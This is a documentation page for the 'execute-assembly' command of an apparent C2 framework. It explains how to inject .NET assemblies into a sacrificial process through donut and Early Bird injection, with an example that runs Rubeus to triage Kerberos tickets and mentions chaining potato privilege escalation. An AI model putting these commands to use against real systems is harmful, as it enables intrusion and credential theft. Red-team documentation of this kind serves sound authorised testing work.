---

title: execute-assembly
descripton: orsted c2 execute-assembly
---

### General

`execute-assembly` allows you to load and run donut assembly in a remote process.

It is the classic fork and run.

```
[Session 73: haroun@DESKTOP-DU89UIV] » execute-assembly --help

Load and Execute Exe with donut

Usage:
  execute-assembly [flags] file [args...]

Args:
  file  string         Assembly to load
  args  string list    Argument of the Assembly

Flags:
  -b, --background           If specified, run process in background without waiting for output. Usefull when migrating or using Potatoes.
  -h, --help                 display help
  -m, --method     string    Method to load Assembly (default: 1)
  -p, --process    string    Sacrificial Process (default: C:\Windows\System32\notepad.exe)
```

It requires you to load the `execute-assembly` dll with `load-module execute-assembly`

Currently only one method is supported (Early Bird). It is not very opsec. Future methods will be available.

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » execute-assembly Rubeus.exe triage
```

The output will be something like

```
[Session 9: haroun@DESKTOP-DU89UIV] » execute-assembly Rubeus.exe triage
+--------+-----------+---------+---------------------------------+
| TASKID | SESSIONID |  STATE  |             COMMAND             |
+--------+-----------+---------+---------------------------------+
|    103 |         9 | pending | execute-assembly 1              |
|        |           |         | C:\Windows\System32\notepad.exe |
+--------+-----------+---------+---------------------------------+
[Session 9: haroun@DESKTOP-DU89UIV] »
 >>> execute-assembly --method 1 --process C:\Windows\System32\notepad.exe Rubeus.exe triage
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> execute-assembly --method 1 --process C:\Windows\System32\notepad.exe Rubeus.exe triage
 <<<
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x598b2

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------


```

If you specify the `--background` flag, the output will not printed. This is usefull in case you don't want to block your beacon, for example when running another beacon through a potato.


`execute-assembly` will look for the executable in three places:

- `NetAssemblyPath` (default value `./tools/windows/dotnet/` specified in `data/clientconf.toml`
- `ExePath` (default value `./tools/windows/exe/` specified in `data/clientconf.toml`
- And in `.`

